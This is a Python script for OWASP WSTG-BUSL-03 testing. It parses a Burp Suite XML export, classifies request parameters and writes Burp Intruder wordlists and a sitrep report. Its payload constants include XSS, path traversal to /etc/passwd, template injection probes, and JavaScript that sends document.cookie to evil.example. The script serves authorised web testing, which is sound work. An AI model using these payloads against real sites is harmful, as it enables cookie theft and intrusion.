#!/usr/bin/env python3
"""
WSTG-BUSL-03 — Integrity Checks
Script 1: busl_03.py

Reads a Burp Suite XML export of requests that move, store, create,
or gate data (save, create, read-own, logged-in-only actions).
Extracts all URL and body parameters, classifies their data types,
generates per-endpoint Burp Intruder wordlists, and writes a sitrep
report summarising what will be tested.

Data type classification:
  alpha        — value contains only letters (a-z, A-Z)
  numeric      — value contains only digits / decimal number
  alphanumeric — value contains both letters and digits (mixed)

Wordlist strategy:
  alpha        → alpha-only category tests (unicode confusion, encoding, injections)
  numeric      → numeric-only category tests (hex, octal, binary, negative, injections)
  alphanumeric → both alpha AND numeric tests, PLUS boundary tests:
                   pure-alpha substitute, pure-numeric substitute,
                   reversed, truncated half

Log-adjacent parameter warning:
  Parameters or paths matching keywords: log, audit, event, trace,
  debug, activity, record, track — flagged in sitrep for manual
  review before sending Intruder payloads.

Inputs:
  WSTG-BUSL-03/inputs/xml/busl_03.xml

Outputs:
  WSTG-BUSL-03/inputs/json/xml_assessment.json
  WSTG-BUSL-03/inputs/wordlist/EP_<INDEX>.txt   (one per endpoint)
  WSTG-BUSL-03/outputs/test_outputs/sitrep.md

Usage:
  python3 WSTG-BUSL-03/utilities/python/busl_03.py \\
      [--xml WSTG-BUSL-03/inputs/xml/busl_03.xml]
"""

import argparse
import base64
import json
import os
import random
import re
import sys
import xml.etree.ElementTree as ET
from datetime import datetime
from urllib.parse import parse_qs, urlparse


# ---------------------------------------------------------------------------
# ANSI
# ---------------------------------------------------------------------------
BOLD    = "\033[1m"
DIM     = "\033[2m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
RED     = "\033[91m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
RESET   = "\033[0m"


# ---------------------------------------------------------------------------
# Log-adjacent keywords — warn before Intruder
# ---------------------------------------------------------------------------
LOG_KEYWORDS = re.compile(
    r'\b(log|audit|event|trace|debug|activity|record|track|journal|history)\b',
    re.IGNORECASE
)


# ---------------------------------------------------------------------------
# Unicode confusion map (shared with BUSL-01 pattern)
# ---------------------------------------------------------------------------
UNICODE_CONFUSABLES = {
    'a': ['а', 'ɑ', 'α'], 'b': ['Ь', 'ƅ', 'ɓ'], 'c': ['с', 'ϲ', 'ć'],
    'd': ['ԁ', 'ɗ', 'ď'], 'e': ['е', 'ё', 'ε'], 'f': ['ƒ', 'ſ'],
    'g': ['ɡ', 'ġ', 'ǵ'], 'h': ['һ', 'ħ', 'ȟ'], 'i': ['і', 'і', 'ı'],
    'j': ['ϳ', 'ĵ', 'ɉ'], 'k': ['κ', 'ķ', 'ƙ'], 'l': ['ӏ', 'ℓ', 'ļ'],
    'm': ['м', 'ɱ', 'ṁ'], 'n': ['п', 'ŋ', 'ń'], 'o': ['о', 'ο', '0'],
    'p': ['р', 'ρ', 'ƿ'], 'q': ['զ', 'ԛ', 'ɋ'], 'r': ['г', 'ŗ', 'ȓ'],
    's': ['ѕ', 'ş', 'ś'], 't': ['т', 'ţ', 'ť'], 'u': ['υ', 'ü', 'ū'],
    'v': ['ν', 'ѵ', 'ṽ'], 'w': ['ѡ', 'ώ', 'ŵ'], 'x': ['х', 'χ', '×'],
    'y': ['у', 'ý', 'ÿ'], 'z': ['ʐ', 'ż', 'ź'],
    'A': ['А', 'Α', 'Ꭺ'], 'B': ['В', 'Β', 'Ᏼ'], 'C': ['С', 'Ϲ', 'Ꮯ'],
    'D': ['Ꭰ', 'Ḋ', 'Đ'], 'E': ['Е', 'Ε', 'Ꭼ'], 'F': ['Ƒ', 'Ϝ'],
    'G': ['Ġ', 'Ĝ', 'Ğ'], 'H': ['Н', 'Η', 'Ꮋ'], 'I': ['І', 'Ι', 'Ꭵ'],
    'J': ['Ĵ', 'Ϳ'],       'K': ['К', 'Κ', 'Ꮶ'], 'L': ['Ꮮ', 'Ļ', 'Ĺ'],
    'M': ['М', 'Μ', 'Ꮇ'], 'N': ['Ν', 'Ꮑ', 'Ń'], 'O': ['О', 'Ο', '0'],
    'P': ['Р', 'Ρ', 'Ꭾ'], 'Q': ['Ԛ', 'Ꝗ'],       'R': ['Ʀ', 'Ꮢ', 'Ŗ'],
    'S': ['Ѕ', 'Ś', 'Ş'], 'T': ['Т', 'Τ', 'Ꭲ'], 'U': ['Ü', 'Ū', 'Ʊ'],
    'V': ['Ѵ', 'Ꮩ', 'Ṽ'], 'W': ['Ѡ', 'Ꮃ', 'Ŵ'], 'X': ['Х', 'Χ', 'Ꭓ'],
    'Y': ['У', 'Υ', 'Ÿ'], 'Z': ['Ζ', 'Ż', 'Ź'],
    '0': ['О', 'о', 'Ο'], '1': ['ı', 'ｌ', 'І'], '2': ['２', 'ƻ'],
    '3': ['３', 'Ʒ'],       '4': ['４', 'Ч'],       '5': ['５', 'Ƽ'],
    '6': ['６', 'б'],       '7': ['７', '٧'],       '8': ['８', 'Ȣ'],
    '9': ['９', 'ɋ'],
}
VOWELS = set('aeiouAEIOU')

RANDOM_WORDS   = ['banana', 'system', 'delete', 'purple', 'hunter', 'widget', 'falcon']
RANDOM_NUMBERS = [42, 999, 1337, 8080, 31337, 65535, 0]

SPECIAL_CHARS_LINES = [
    '"><img src=x>\'',
    '\x00\x01\x02\x03\x04\x05\x06\x07',
    '../../../../etc/passwd',
    '%00%0a%0d%09%0b',
    '¡¢£¤¥¦§¨©ª«¬®¯°±²³',
    '​‌‍⁠﻿',
]
TEMPLATE_INJECTION = [
    '{{7*7}}${7*7}#{7*7}',
    '<%= 7 * 7 %>{{config.__class__.__init__.__globals__}}',
]
JAVASCRIPT_PAYLOADS = [
    'javascript:void(document.location=\'https://evil.example/\'+document.cookie)',
    '<script>fetch(\'https://evil.example/\',{method:\'POST\',body:JSON.stringify({c:document.cookie})})</script>',
]


# ---------------------------------------------------------------------------
# Encoding helpers
# ---------------------------------------------------------------------------

def _pick(lst, n=2):
    return lst[:n] if len(lst) >= n else lst[:]

def to_hex(s):     return ''.join(f'\\x{ord(c):02x}' for c in s)
def to_decimal(s): return ' '.join(str(ord(c)) for c in s)
def to_binary(s):  return ' '.join(f'{ord(c):08b}' for c in s)

def unicode_full(s):
    return ''.join(UNICODE_CONFUSABLES.get(ch, [ch])[0] if UNICODE_CONFUSABLES.get(ch) else ch for ch in s)

def unicode_partial(s):
    return ''.join(
        UNICODE_CONFUSABLES.get(ch, [ch])[0] if ch in VOWELS and UNICODE_CONFUSABLES.get(ch) else ch
        for ch in s
    )

def unicode_digits(s):
    return ''.join(UNICODE_CONFUSABLES.get(ch, [ch])[0] if UNICODE_CONFUSABLES.get(ch) else ch for ch in s)


# ---------------------------------------------------------------------------
# Wordlist generators
# ---------------------------------------------------------------------------

def _section(lines, label, entries, n=2):
    lines.append(f"# --- {label} ---")
    for e in _pick(entries, n):
        if e.strip():
            lines.append(e)


def generate_alpha_wordlist(value: str) -> list[str]:
    lines = []
    rword = random.choice(RANDOM_WORDS)
    _section(lines, "A1 Unicode full confusion",        [unicode_full(value), unicode_full(value[::-1]) if len(value)>1 else unicode_full(value+'x')])
    _section(lines, "A2 Unicode partial (vowels)",      [unicode_partial(value), unicode_partial(value.upper())])
    _section(lines, "A3 Hex encoding",                  [to_hex(value), to_hex(value.upper())])
    _section(lines, "A4 Decimal encoding",              [to_decimal(value), to_decimal(value.upper())])
    _section(lines, "A5 Binary encoding",               [to_binary(value)])
    _section(lines, "A6 Random word unicode",           [unicode_full(rword)])
    _section(lines, "A6 Random word hex",               [to_hex(rword)])
    _section(lines, "A6 Random word decimal",           [to_decimal(rword)])
    _section(lines, "A7 Special characters",            _pick(SPECIAL_CHARS_LINES, 3))
    _section(lines, "A8 Integer-only",                  ["12345", "0", "99999999"])
    _section(lines, "A9 Negative numbers",              ["-1", "-9999", "-0"])
    _section(lines, "A10 Template injection",           _pick(TEMPLATE_INJECTION, 2))
    _section(lines, "A11 JavaScript injection",         _pick(JAVASCRIPT_PAYLOADS, 2))
    return lines


def generate_numeric_wordlist(value: str) -> list[str]:
    lines = []
    rnum = random.choice(RANDOM_NUMBERS)
    try:
        num_int = int(float(value))
    except ValueError:
        num_int = 0
    _section(lines, "N1 Unicode digit confusion",       [unicode_digits(value), unicode_digits(str(num_int+1))])
    _section(lines, "N2 Hex representation",            [hex(num_int), f'0x{num_int:08X}'])
    _section(lines, "N3 Octal representation",          [oct(num_int), f'{num_int:o}'])
    _section(lines, "N4 Binary representation",         [bin(num_int), f'{num_int:b}'])
    _section(lines, "N5 Negative values",               [str(-num_int), str(-num_int-1)])
    _section(lines, "N6 Random number unicode",         [unicode_digits(str(rnum))])
    _section(lines, "N6 Random number hex",             [hex(rnum)])
    _section(lines, "N6 Random number octal",           [oct(rnum)])
    _section(lines, "N7 Special characters",            _pick(SPECIAL_CHARS_LINES, 3))
    _section(lines, "N8 Alpha-only strings",            ["admin", "true", "NaN"])
    _section(lines, "N9 Template injection",            _pick(TEMPLATE_INJECTION, 2))
    _section(lines, "N10 JavaScript injection",         _pick(JAVASCRIPT_PAYLOADS, 2))
    return lines


def generate_alphanumeric_wordlist(value: str) -> list[str]:
    """Alpha + numeric tests, plus alphanumeric boundary cases."""
    lines = []

    # Extract alpha and numeric portions
    alpha_part   = re.sub(r'[^a-zA-Z]', '', value) or random.choice(RANDOM_WORDS)
    numeric_part = re.sub(r'[^0-9]',    '', value) or str(random.choice(RANDOM_NUMBERS))
    try:
        num_int = int(numeric_part)
    except ValueError:
        num_int = 0

    lines.append("# ── ALPHANUMERIC BOUNDARY TESTS ──")
    _section(lines, "AN1 Pure alpha substitute",         [alpha_part, alpha_part.upper()])
    _section(lines, "AN2 Pure numeric substitute",       [numeric_part, str(num_int + 1)])
    _section(lines, "AN3 Reversed",                      [value[::-1]])
    _section(lines, "AN4 Truncated (first half)",        [value[:max(1, len(value)//2)]])
    lines.append("")

    # Full alpha tests on the alpha portion
    lines.append("# ── ALPHA-PORTION TESTS ──")
    lines.extend(generate_alpha_wordlist(alpha_part))
    lines.append("")

    # Full numeric tests on the numeric portion
    lines.append("# ── NUMERIC-PORTION TESTS ──")
    lines.extend(generate_numeric_wordlist(numeric_part))

    return lines


# ---------------------------------------------------------------------------
# Data type classification
# ---------------------------------------------------------------------------

def classify_value(v: str) -> str:
    if not v:
        return "empty"
    has_alpha   = bool(re.search(r'[a-zA-Z]', v))
    has_numeric = bool(re.search(r'[0-9]', v))
    if has_alpha and has_numeric:
        return "alphanumeric"
    if has_alpha:
        return "alpha"
    if has_numeric:
        return "numeric"
    return "other"


# ---------------------------------------------------------------------------
# Burp XML helpers
# ---------------------------------------------------------------------------

def decode_element(elem) -> str:
    if elem is None:
        return ""
    raw = elem.text or ""
    if elem.get("base64") == "true":
        try:
            return base64.b64decode(raw).decode("utf-8", errors="replace")
        except Exception:
            return raw
    return raw


def parse_burp_xml(path: str) -> list[dict]:
    try:
        tree = ET.parse(path)
    except (ET.ParseError, FileNotFoundError) as e:
        print(f"{RED}[!] XML error: {e}{RESET}", file=sys.stderr)
        sys.exit(1)

    items = []
    for idx, item in enumerate(tree.getroot().findall("item")):
        url    = decode_element(item.find("url"))
        method = decode_element(item.find("method")).upper()
        req    = decode_element(item.find("request"))
        parts    = req.split("\r\n\r\n", 1)
        req_body = parts[1] if len(parts) > 1 else ""
        items.append({
            "index":    idx,
            "url":      url,
            "method":   method,
            "req_body": req_body,
        })
    return items


# ---------------------------------------------------------------------------
# Parameter extraction — ALL types (not just alpha/numeric like BUSL-01)
# ---------------------------------------------------------------------------

def extract_all_params(item: dict) -> list[dict]:
    found      = []
    url_parsed = urlparse(item["url"])

    # URL parameters
    if url_parsed.query:
        for key, vals in parse_qs(url_parsed.query, keep_blank_values=False).items():
            for v in vals:
                found.append({
                    "name":      key,
                    "value":     v,
                    "datatype":  classify_value(v),
                    "place":     "url",
                })

    # Body parameters
    body = item["req_body"].strip()
    if body:
        if body.startswith("{") or body.startswith("["):
            try:
                obj = json.loads(body)
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        sv = str(v) if not isinstance(v, str) else v
                        found.append({
                            "name":     k,
                            "value":    sv,
                            "datatype": classify_value(sv),
                            "place":    "body",
                        })
            except Exception:
                pass
        elif "=" in body:
            try:
                for key, vals in parse_qs(body, keep_blank_values=False).items():
                    for v in vals:
                        found.append({
                            "name":     key,
                            "value":    v,
                            "datatype": classify_value(v),
                            "place":    "body",
                        })
            except Exception:
                pass

    return found


# ---------------------------------------------------------------------------
# Log-adjacent detection
# ---------------------------------------------------------------------------

def has_log_risk(path: str, params: list[dict]) -> list[str]:
    triggers = []
    if LOG_KEYWORDS.search(path):
        triggers.append(f"path contains log-adjacent keyword: '{path}'")
    for p in params:
        if LOG_KEYWORDS.search(p["name"]):
            triggers.append(f"parameter name '{p['name']}' matches log keyword")
    return triggers


# ---------------------------------------------------------------------------
# Sitrep report builder
# ---------------------------------------------------------------------------

def build_sitrep(
    items:         list[dict],
    ep_data:       dict,
    wordlist_dir:  str,
    xml_path:      str,
    json_path:     str,
) -> str:
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    lines   = []

    lines.append("# WSTG-BUSL-03 — Integrity Checks — Sitrep")
    lines.append("")
    lines.append(f"**Generated:** {now_str}  ")
    lines.append(f"**Source XML:** `{xml_path}`  ")
    lines.append(f"**Assessment JSON:** `{json_path}`  ")
    lines.append(f"**Endpoints scanned:** {len(items)}  ")
    lines.append(f"**Endpoints with testable parameters:** {len(ep_data)}  ")
    lines.append("")
    lines.append("---")
    lines.append("")

    # Log-risk warnings
    log_warnings = []
    for idx_str, ep in ep_data.items():
        triggers = ep.get("log_risk_triggers", [])
        if triggers:
            log_warnings.append((ep["path"], triggers))

    if log_warnings:
        lines.append("## ⚠️ Log-Adjacent Parameter Warning")
        lines.append("")
        lines.append(
            "The following endpoints contain parameters or paths that match log-adjacent "
            "keywords (`log`, `audit`, `event`, `trace`, `debug`, `activity`, `record`, `track`).  \n"
            "**Review manually before sending Intruder payloads** — injecting into log fields may "
            "write unsanitised data to server-side log files (log injection, CWE-117)."
        )
        lines.append("")
        for path, triggers in log_warnings:
            lines.append(f"- **`{path}`**")
            for t in triggers:
                lines.append(f"  - {t}")
        lines.append("")
        lines.append("---")
        lines.append("")

    # Endpoint table
    lines.append("## Testable Endpoints")
    lines.append("")
    lines.append("| Index | Method | Path | Parameters | Types | Wordlist |")
    lines.append("|-------|--------|------|------------|-------|----------|")

    for idx_str, ep in sorted(ep_data.items(), key=lambda x: int(x[0])):
        params    = ep["parameters"]
        type_set  = sorted({p["datatype"] for p in params})
        param_names = ", ".join(f"`{p['name']}`" for p in params[:4])
        if len(params) > 4:
            param_names += f" +{len(params)-4} more"
        wl = f"`EP_{ep['endpoint_index']}.txt`"
        lines.append(
            f"| {ep['endpoint_index']} | `{ep['method']}` | `{ep['path'][:45]}` "
            f"| {param_names} | {', '.join(type_set)} | {wl} |"
        )

    lines.append("")
    lines.append("---")
    lines.append("")

    # Per-endpoint detail
    lines.append("## Per-Endpoint Detail")
    lines.append("")

    for idx_str, ep in sorted(ep_data.items(), key=lambda x: int(x[0])):
        idx    = ep["endpoint_index"]
        params = ep["parameters"]
        wl_path = os.path.join(wordlist_dir, f"EP_{idx}.txt")

        lines.append(f"### [{idx}] `{ep['method']} {ep['path']}`")
        lines.append("")
        lines.append(f"**Wordlist:** `{wl_path}`  ")
        lines.append(f"**Parameters ({len(params)}):**")
        lines.append("")
        lines.append("| Place | Name | Value (truncated) | Data Type |")
        lines.append("|-------|------|--------------------|-----------|")
        for p in params:
            lines.append(
                f"| {p['place']} | `{p['name']}` "
                f"| `{p['value'][:40]}{'...' if len(p['value'])>40 else ''}` "
                f"| {p['datatype']} |"
            )
        lines.append("")

        if ep.get("log_risk_triggers"):
            lines.append(f"⚠️ **Log risk:** {'; '.join(ep['log_risk_triggers'])}")
            lines.append("")

        lines.append("---")
        lines.append("")

    # Wordlist index
    lines.append("## Wordlist Index")
    lines.append("")
    lines.append(f"All wordlists written to: `{wordlist_dir}/`")
    lines.append("")
    lines.append("| Wordlist File | Endpoint | Types |")
    lines.append("|---------------|----------|-------|")
    for idx_str, ep in sorted(ep_data.items(), key=lambda x: int(x[0])):
        type_set = sorted({p["datatype"] for p in ep["parameters"]})
        wl_path  = os.path.join(wordlist_dir, f"EP_{ep['endpoint_index']}.txt")
        lines.append(
            f"| `{wl_path}` "
            f"| [{ep['endpoint_index']}] `{ep['method']} {ep['path'][:40]}` "
            f"| {', '.join(type_set)} |"
        )
    lines.append("")
    lines.append("---")
    lines.append("")
    lines.append("## Next Steps")
    lines.append("")
    lines.append(
        "1. For each endpoint above, send the relevant request to **Burp Intruder** (Sniper mode).\n"
        "2. Mark the parameter value under test as the payload position.\n"
        "3. Load the corresponding `EP_<N>.txt` as a **Simple List** payload.\n"
        "4. Start attack. Export results as XML.\n"
        "5. Run `verdict_busl_03.py --intruder inputs/xml/intruder_tests.xml` to parse results.\n"
    )
    lines.append("---")
    lines.append("*Generated by busl_03.py — WSTG-BUSL-03*")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    p = argparse.ArgumentParser(
        description="WSTG-BUSL-03 Script 1: Integrity check scanner + wordlist generator"
    )
    p.add_argument("--xml",
        default=os.path.join("WSTG-BUSL-03", "inputs", "xml", "busl_03.xml"),
        metavar="PATH")
    p.add_argument("--json-out",
        default=os.path.join("WSTG-BUSL-03", "inputs", "json", "xml_assessment.json"),
        metavar="PATH")
    p.add_argument("--wordlist-dir",
        default=os.path.join("WSTG-BUSL-03", "inputs", "wordlist"),
        metavar="DIR")
    p.add_argument("--report-dir",
        default=os.path.join("WSTG-BUSL-03", "outputs", "test_outputs"),
        metavar="DIR")
    args = p.parse_args()

    width = 65
    print(f"\n{BOLD}{'='*width}{RESET}")
    print(f"{BOLD} WSTG-BUSL-03 — Integrity Check Scanner{RESET}")
    print(f"{BOLD}{'='*width}{RESET}")
    print(f"  XML : {args.xml}\n")

    items = parse_burp_xml(args.xml)
    print(f"  Parsed {len(items)} request(s)\n")

    os.makedirs(os.path.dirname(args.json_out),  exist_ok=True)
    os.makedirs(args.wordlist_dir,               exist_ok=True)
    os.makedirs(args.report_dir,                 exist_ok=True)

    ep_data       = {}
    wordlist_count = 0

    for item in items:
        idx    = item["index"]
        url    = item["url"]
        method = item["method"]

        parsed_url = urlparse(url)
        path       = parsed_url.path or url

        params = extract_all_params(item)
        if not params:
            print(f"  [{idx:3d}] {DIM}no parameters — skipped{RESET}")
            continue

        log_triggers = has_log_risk(path, params)

        print(f"  [{idx:3d}] {method:<7} {path[:55]}{'...' if len(path)>55 else ''}")
        for q in params:
            dtype_color = {
                "alpha":        CYAN,
                "numeric":      YELLOW,
                "alphanumeric": MAGENTA,
            }.get(q["datatype"], DIM)
            print(
                f"         {dtype_color}{q['datatype']:<14}{RESET}  "
                f"{q['place']:<5}  `{q['name']}` = `{q['value'][:40]}`"
            )

        if log_triggers:
            for t in log_triggers:
                print(f"         {RED}⚠ LOG RISK:{RESET} {t}")

        ep_data[str(idx)] = {
            "endpoint_index":    idx,
            "method":            method,
            "path":              path,
            "parameters":        params,
            "log_risk_triggers": log_triggers,
        }

        # Generate wordlist
        wordlist_lines = [
            f"# WSTG-BUSL-03 Wordlist — Endpoint {idx}",
            f"# Path   : {path}",
            f"# Method : {method}",
            f"# Generated: {datetime.now().isoformat()}",
            "#",
            "# Load in Burp Intruder → Payloads → Simple List",
            "# Lines beginning with '#' are comments — Intruder skips them.",
            "#",
        ]

        for q in params:
            wordlist_lines.append(f"# ════ Parameter: {q['name']} ({q['datatype']}, {q['place']}) ════")
            if q["datatype"] == "alpha":
                wordlist_lines.extend(generate_alpha_wordlist(q["value"]))
            elif q["datatype"] == "numeric":
                wordlist_lines.extend(generate_numeric_wordlist(q["value"]))
            elif q["datatype"] == "alphanumeric":
                wordlist_lines.extend(generate_alphanumeric_wordlist(q["value"]))
            else:
                # other — use alpha as fallback
                wordlist_lines.append(f"# (datatype '{q['datatype']}' — using alpha tests as fallback)")
                wordlist_lines.extend(generate_alpha_wordlist(q["value"]))
            wordlist_lines.append("")

        wl_path = os.path.join(args.wordlist_dir, f"EP_{idx}.txt")
        with open(wl_path, "w", encoding="utf-8") as f:
            f.write("\n".join(wordlist_lines) + "\n")
        print(f"         {GREEN}→ {wl_path}{RESET}")
        wordlist_count += 1

    # Write assessment JSON
    assessment = {
        "_meta": {
            "source_xml":       args.xml,
            "generated":        datetime.now().isoformat(),
            "total_endpoints":  len(items),
            "testable_eps":     len(ep_data),
        },
        "endpoints": {
            idx_str: {
                "endpoint_index":    ep["endpoint_index"],
                "method":            ep["method"],
                "path":              ep["path"],
                "parameters": [
                    {
                        "parameter_place": p["place"],
                        "parameter_name":  p["name"],
                        "parameter_value": p["value"],
                        "datatype":        p["datatype"],
                    }
                    for p in ep["parameters"]
                ],
                "log_risk_triggers": ep["log_risk_triggers"],
            }
            for idx_str, ep in ep_data.items()
        },
    }

    with open(args.json_out, "w", encoding="utf-8") as f:
        json.dump(assessment, f, indent=2, ensure_ascii=False)
    print(f"\n{GREEN}[+] xml_assessment.json → {args.json_out}{RESET}")

    # Write sitrep
    sitrep = build_sitrep(items, ep_data, args.wordlist_dir, args.xml, args.json_out)
    sitrep_path = os.path.join(args.report_dir, "sitrep.md")
    with open(sitrep_path, "w", encoding="utf-8") as f:
        f.write(sitrep)
    print(f"{GREEN}[+] sitrep.md          → {sitrep_path}{RESET}")
    print(f"{GREEN}[+] Wordlists          → {args.wordlist_dir}/{RESET}")
    print(f"    {wordlist_count} wordlist(s) written")

    # Print sitrep summary to terminal
    print(f"\n{BOLD}{'─'*width}{RESET}")
    print(f"{BOLD} Sitrep — Testable Endpoints{RESET}")
    print(f"{BOLD}{'─'*width}{RESET}\n")
    for idx_str, ep in sorted(ep_data.items(), key=lambda x: int(x[0])):
        params   = ep["parameters"]
        type_set = sorted({p["datatype"] for p in params})
        wl_path  = os.path.join(args.wordlist_dir, f"EP_{ep['endpoint_index']}.txt")
        log_warn = f"  {RED}⚠ LOG{RESET}" if ep["log_risk_triggers"] else ""
        print(
            f"  [{ep['endpoint_index']:3d}] {ep['method']:<7} "
            f"{ep['path'][:45]:<45}  "
            f"{CYAN}{', '.join(type_set):<18}{RESET}  "
            f"wordlist: {wl_path}"
            f"{log_warn}"
        )

    print(f"\n  Next: run Intruder with EP_<N>.txt, export XML,")
    print(f"        then: verdict_busl_03.py --intruder inputs/xml/intruder_tests.xml")
    print()


if __name__ == "__main__":
    main()
